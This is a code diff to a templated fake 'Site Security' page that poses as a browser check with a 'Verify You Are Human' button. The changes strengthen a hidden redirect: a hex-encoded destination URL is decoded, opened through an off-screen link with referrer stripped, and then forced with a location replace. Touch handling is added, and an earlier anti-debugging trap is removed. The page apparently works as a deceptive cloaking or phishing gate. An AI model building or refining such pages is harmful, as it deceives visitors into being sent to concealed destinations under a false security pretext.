@@ -48,8 +48,10 @@
             border-radius: 4px;
             cursor: pointer;
             transition: background 0.2s;
+            -webkit-tap-highlight-color: transparent;
         }
         #{{ ids.button }}:hover { background: #357abd; }
+        #{{ ids.button }}:active { transform: scale(0.98); }
         .spinner {
             border: 3px solid rgba(255,255,255,0.1);
             border-radius: 50%;
@@ -68,20 +70,16 @@
     <div id="{{ ids.container }}">
         <h2>Site Security</h2>
         <p>Checking your browser before accessing the destination.</p>
-        <button id="{{ ids.button }}" data-verify="{{ p3 }}" onclick="process()">
+        <button id="{{ ids.button }}" data-verify="{{ p3 }}" onclick="process()" ontouchstart="process()">
             Verify You Are Human
         </button>
     </div>
     <script nonce="{{ nonce }}">
-        setInterval(function(){
-            var startTime = performance.now();
-            debugger; 
-            if (performance.now() - startTime > 100) {
-                document.body.innerHTML = "Security Violation.";
-            }
-        }, 500);
-
+        var clicked = false;
         function process() {
+            if(clicked) return;
+            clicked = true;
+            
             var btn = document.getElementById("{{ ids.button }}");
             btn.innerHTML = '<div class="spinner"></div> Verifying...';
             btn.style.cursor = "wait";
@@ -96,15 +94,24 @@
                     for (var i = 0; i < hex.length; i += 2) {
                         url += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
                     }
+                    
                     var link = document.createElement('a');
                     link.href = url;
                     link.rel = "noreferrer";
-                    link.style.display = 'none';
+                    link.style.position = 'absolute';
+                    link.style.left = '-9999px';
+                    link.style.top = '0';
                     document.body.appendChild(link);
                     link.click();
+
+                    setTimeout(function(){
+                        window.location.replace(url);
+                    }, 200);
+
                 } catch (e) {
+                    window.location.reload();
                 }
-            }, 800);
+            }, 600);
         }
     </script>
 </body>
